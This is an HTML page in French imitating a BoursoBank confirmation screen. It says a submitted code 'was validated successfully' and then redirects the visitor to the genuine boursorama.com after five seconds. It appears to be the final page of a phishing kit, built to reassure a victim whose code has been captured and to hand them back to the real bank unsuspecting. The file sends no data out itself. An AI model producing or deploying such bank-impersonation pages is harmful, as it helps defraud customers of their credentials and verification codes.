

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Succès - Boursobank</title>
    <style>
        /* Corps général */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Conteneur principal */
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        /* Logo principal */
        .top-logo {
            margin-bottom: 70px;
            width: 100%;
            height: 20%;
        }

        .top-logo img {
            max-width: 200px;
        }

        /* Boîte de confirmation */
        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            height: 400px;
            overflow: hidden;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }

        /* Bande rose */
        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
        }

        /* Titre succès */
        .success-message {
            font-size: 1.5rem;
            font-weight: bold;
            color: #27ae60;
            margin-bottom: 15px;
        }

        /* Texte secondaire */
        .sub-message {
            font-size: 1rem;
            color: #555;
            margin-bottom: 30px;
        }

        /* Animation de chargement */
        .loading-dots {
            font-size: 2rem;
            font-weight: bold;
            color: #d9007f;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo principal -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Principal">
        </div>

        <!-- Boîte de succès -->
        <div class="form-box">
            <!-- Bande rose -->
            <div class="header-bar"></div>

            <!-- Message de succès -->
            <div class="success-message">Succès !</div>
            <div class="sub-message">Votre code a été validé avec succès.</div>
            <div class="loading-dots">●●●</div>
        </div>
    </div>

    <script>
        // Redirige vers la page finale après 5 secondes
        setTimeout(() => {
            window.location.href = "https://www.boursorama.com/"; // Remplacez "page-finale.html" par le lien de la page finale
        }, 5000);
    </script>
</body>
</html>
